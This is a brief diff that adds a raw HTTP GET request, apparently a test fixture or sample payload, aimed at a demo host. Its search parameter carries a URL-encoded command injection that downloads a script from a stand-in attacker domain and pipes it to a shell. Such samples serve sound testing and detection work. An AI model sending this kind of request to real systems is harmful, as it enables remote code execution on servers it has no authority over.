@@ -1,0 +1,4 @@
+GET /a?search=curl%20http://evil.tld/i.sh%20|%20sh HTTP/1.1
+Host: demo.example.com
+Connection: close
+
